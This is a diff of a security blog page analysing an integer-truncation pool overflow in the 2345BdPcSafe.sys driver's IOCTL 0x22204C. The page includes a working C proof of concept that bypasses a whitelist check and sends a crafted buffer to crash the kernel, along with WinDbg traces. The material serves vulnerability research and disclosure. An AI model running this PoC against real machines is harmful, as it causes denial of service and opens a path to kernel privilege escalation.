@@ -15,8 +15,9 @@
 <meta property="og:url" content="https://anhkgg.github.io/vul-2345-3/index.html">
 <meta property="og:site_name" content="Anhkgg&#39;Lab | Windows Kernel | Rootkit | Reverse Engineer | Expolit | 内核研究 | 逆向分析 | 漏洞分析挖掘">
 <meta property="og:description" content="漏洞概述 软件网址：http://safe.2345.cc/ 版本：v3.7 X64  2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg">
-<meta property="og:updated_time" content="2018-07-13T04:26:58.031Z">
+<meta property="og:updated_time" content="2018-07-13T04:26:58.032Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2345内核拒绝服务漏洞（3） - WORD的锅">
 <meta name="twitter:description" content="漏洞概述 软件网址：http://safe.2345.cc/ 版本：v3.7 X64  2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。">
@@ -182,23 +183,23 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul>
-<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="external">http://safe.2345.cc/</a></li>
+<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
 <li>版本：v3.7 X64</li>
 </ul>
 <p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。</p>
 <a id="more"></a>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x22204C</code>接口进行处理时，有一段拷贝字符串的操作如下所示：</p>
 <p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">struct _ioctl_buf</div><div class="line">&#123;</div><div class="line">  WORD len;</div><div class="line">  WORD len_;</div><div class="line">  DWORD unk2;</div><div class="line">  _ioctl_buf_str *ptr;</div><div class="line">&#125;;</div><div class="line">struct _ioctl_buf_str</div><div class="line">&#123;</div><div class="line">  wchar_t buf[1];</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _ioctl_buf</span><br><span class="line">&#123;</span><br><span class="line">  WORD len;</span><br><span class="line">  WORD len_;</span><br><span class="line">  DWORD unk2;</span><br><span class="line">  _ioctl_buf_str *ptr;</span><br><span class="line">&#125;;</span><br><span class="line">struct _ioctl_buf_str</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t buf[1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <p><code>a2</code>是一个<code>_ioctl_buf</code>结构（由应用层输入构造而成），<code>len2</code>是输入的另一个字符串的长度，通过<code>a2-&gt;len</code>（2字节）和<code>len2</code>（2字节）计算得到<code>len1</code>，关键在于<code>len1</code>是也一个<code>WORD</code>变量，只有2字节，所以当<code>a2-&gt;len+len2</code>的大小超过<code>WORD</code>溢出之后，会被截断成<code>WORD</code>，截断后的值赋给<code>len1</code>，此时就可能导致<code>len1</code>的值反而小于<code>a2-&gt;len</code>。比如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0xa3d0 + 0xb4f0 = 0x158C0 =&gt;截断=&gt; 0x58C0</div><div class="line">0x58C0 &lt; 0xa3d0</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xa3d0 + 0xb4f0 = 0x158C0 =&gt;截断=&gt; 0x58C0</span><br><span class="line">0x58C0 &lt; 0xa3d0</span><br></pre></td></tr></table></figure>
 <p>接着根据<code>len1</code>分配内存<code>p</code>，<code>memmove</code>拷贝<code>a2-&gt;ptr</code>内容到<code>p</code>中，长度按<code>a2-&gt;len</code>，问题就来了，<code>a2-len</code>大于<code>len1</code>时，就会导致拷贝溢出，<code>bsod</code>（写溢出，可控制内容，可以做更多的利用了，这里我不擅长了）。</p>
 <p>好了，漏洞成因这里就分析完了。</p>
 <p>下面看一下<code>poc</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">int poc()</div><div class="line">&#123;</div><div class="line">	</div><div class="line">	DWORD BytesReturned = 0;</div><div class="line"></div><div class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</div><div class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">    //过白名单检查</div><div class="line">	if (!BypassChk(h)) &#123;</div><div class="line">		return 1;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">//BSOD</div><div class="line">	DWORD ctlcode = 0x22204C;</div><div class="line">#pragma pack(push, 1)</div><div class="line">	struct _ioctl_buf_in</div><div class="line">	&#123;</div><div class="line">		DWORD unk1;</div><div class="line">		DWORD unk2;//4</div><div class="line">		DWORD offset1;//8 =0x18</div><div class="line">		DWORD offset2;//c =A3E8</div><div class="line">		DWORD offset3;//10</div><div class="line">		DWORD unk3;//14</div><div class="line">		char buf1[0xa3d0];//18</div><div class="line">		char buf2[0xb4f0];//18+a3d0 </div><div class="line">	&#125;; //0x158D8</div><div class="line">#pragma pack(pop)</div><div class="line"></div><div class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</div><div class="line">	buff.unk1 = 4;</div><div class="line">	buff.unk3 = 4;</div><div class="line">	buff.offset1 = 0x18;</div><div class="line">	buff.offset2 = (char*)&amp;buff.buf2 - (char*)&amp;buff;</div><div class="line">	buff.offset3 = 0;</div><div class="line">	memset(buff.buf1, 0x41, 0xa3d0);</div><div class="line">	memset(buff.buf2, 0x41, 0xb4f0);</div><div class="line"></div><div class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, 0, &amp;BytesReturned, NULL)) &#123;</div><div class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line">	if (!BypassChk(h)) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">//BSOD</span><br><span class="line">	DWORD ctlcode = 0x22204C;</span><br><span class="line">#pragma pack(push, 1)</span><br><span class="line">	struct _ioctl_buf_in</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD unk1;</span><br><span class="line">		DWORD unk2;//4</span><br><span class="line">		DWORD offset1;//8 =0x18</span><br><span class="line">		DWORD offset2;//c =A3E8</span><br><span class="line">		DWORD offset3;//10</span><br><span class="line">		DWORD unk3;//14</span><br><span class="line">		char buf1[0xa3d0];//18</span><br><span class="line">		char buf2[0xb4f0];//18+a3d0 </span><br><span class="line">	&#125;; //0x158D8</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"></span><br><span class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">	buff.unk1 = 4;</span><br><span class="line">	buff.unk3 = 4;</span><br><span class="line">	buff.offset1 = 0x18;</span><br><span class="line">	buff.offset2 = (char*)&amp;buff.buf2 - (char*)&amp;buff;</span><br><span class="line">	buff.offset3 = 0;</span><br><span class="line">	memset(buff.buf1, 0x41, 0xa3d0);</span><br><span class="line">	memset(buff.buf2, 0x41, 0xb4f0);</span><br><span class="line"></span><br><span class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, 0, &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>其中<code>buff.buf1</code>和<code>buff.buf2</code>的长度<code>0xa3d0 + 0xb4f0 = 0x158c0</code>（截断）就是<code>a2-&gt;len</code>(<code>0x58c0</code>)，<code>buff.buf2</code>的长度<code>b4f0</code>就是<code>len2</code>。</p>
 <p>我们在调试中看一下计算结果，可以清晰看到<code>len1=0xdb2 &lt; 0x58c0(a2-&gt;len)</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0: kd&gt; p</div><div class="line">2345BdPcSafe+0x561c:</div><div class="line">fffff880`0540561c 660307          add     ax,word ptr [rdi]</div><div class="line">0: kd&gt; r rdi</div><div class="line">rdi=fffffa8026539658</div><div class="line">0: kd&gt; dw fffffa8026539658 l1</div><div class="line">fffffa80`26539658  58c0</div><div class="line">//a2-&gt;len = 0x58c0</div><div class="line">0: kd&gt; p</div><div class="line">2345BdPcSafe+0x561f:</div><div class="line">fffff880`0540561f 664103c1        add     ax,r9w</div><div class="line">0: kd&gt; r rax</div><div class="line">rax=00000000000058c2</div><div class="line">//len2 = 0xb4f0</div><div class="line">0: kd&gt; r r9</div><div class="line">r9=000000000000b4f0</div><div class="line">0: kd&gt; p</div><div class="line">2345BdPcSafe+0x5623:</div><div class="line">fffff880`05405623 0fb7d0          movzx   edx,ax</div><div class="line">0: kd&gt; r rax</div><div class="line">rax=0000000000000db2</div><div class="line">//len1 = 0xdb2</div><div class="line">0: kd&gt; p</div><div class="line">2345BdPcSafe+0x562a:</div><div class="line">fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]</div><div class="line">0: kd&gt; dq fffff880`054364e8 l1</div><div class="line">fffff880`054364e8  fffff800`03ff70e0</div><div class="line">0: kd&gt; u fffff800`03ff70e0</div><div class="line">nt!ExAllocatePoolWithTag:</div><div class="line">fffff800`03ff70e0 fff5            push    rbp</div><div class="line">0: kd&gt; r rcx;r rdx;r r8</div><div class="line">rcx=0000000000000001</div><div class="line">rdx=0000000000000db2</div><div class="line">r8=0000000035343332</div><div class="line">//参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561c:</span><br><span class="line">fffff880`0540561c 660307          add     ax,word ptr [rdi]</span><br><span class="line">0: kd&gt; r rdi</span><br><span class="line">rdi=fffffa8026539658</span><br><span class="line">0: kd&gt; dw fffffa8026539658 l1</span><br><span class="line">fffffa80`26539658  58c0</span><br><span class="line">//a2-&gt;len = 0x58c0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561f:</span><br><span class="line">fffff880`0540561f 664103c1        add     ax,r9w</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=00000000000058c2</span><br><span class="line">//len2 = 0xb4f0</span><br><span class="line">0: kd&gt; r r9</span><br><span class="line">r9=000000000000b4f0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x5623:</span><br><span class="line">fffff880`05405623 0fb7d0          movzx   edx,ax</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=0000000000000db2</span><br><span class="line">//len1 = 0xdb2</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x562a:</span><br><span class="line">fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]</span><br><span class="line">0: kd&gt; dq fffff880`054364e8 l1</span><br><span class="line">fffff880`054364e8  fffff800`03ff70e0</span><br><span class="line">0: kd&gt; u fffff800`03ff70e0</span><br><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff800`03ff70e0 fff5            push    rbp</span><br><span class="line">0: kd&gt; r rcx;r rdx;r r8</span><br><span class="line">rcx=0000000000000001</span><br><span class="line">rdx=0000000000000db2</span><br><span class="line">r8=0000000035343332</span><br><span class="line">//参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);</span><br></pre></td></tr></table></figure>
 <h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞主要是对输入参数结构体的长度字段校验不够严谨，导致变量溢出截断出现意外的大小结果导致了漏洞的产生。</p>
 <p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p>
 <p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-3/">https://anhkgg.github.io/vul-2345-3/</a></p>
@@ -329,6 +330,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/python-bytecode/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          死磕python字节码-手工还原python源码（网鼎杯第四场逆向题chaoyang）
+        
+      </div>
+    </a>
   
   
     <a href="/vul-2345-2/" id="article-nav-older" class="article-nav-link-wrap">
@@ -539,22 +549,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Anti-AntiVirus</a>
               </li>
              
@@ -568,6 +562,10 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">杀毒软件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">aboutme</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -587,7 +585,15 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+                <a href="javascript:void(0)" class="js-tag color4">Windbg调试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RPC</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">远程过程调用</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -600,6 +606,22 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">cookie</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -639,23 +661,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">inject process</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">IDAPro</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">IDC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -688,6 +698,34 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pyspider</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">http</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -731,30 +769,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">libcurl</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">http</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">minihttp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">get_post_ajax</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">IDAPython</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">v2ex</a>
               </li>
              
@@ -763,7 +777,11 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">畅言</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -799,6 +817,18 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">vul</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">FireEye</a>
               </li>
              
@@ -808,6 +838,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">FINSPY</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">upx</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -824,26 +862,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">mmc.exe</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">vul</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">exploit</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">fuzz</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">upx</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">unpack</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -879,14 +897,6 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">windows</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">APC</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">windbg</a>
               </li>
              
@@ -900,6 +910,14 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">win10</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">windows</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">APC</a>
               </li>
             
             <div class="clearfix"></div>
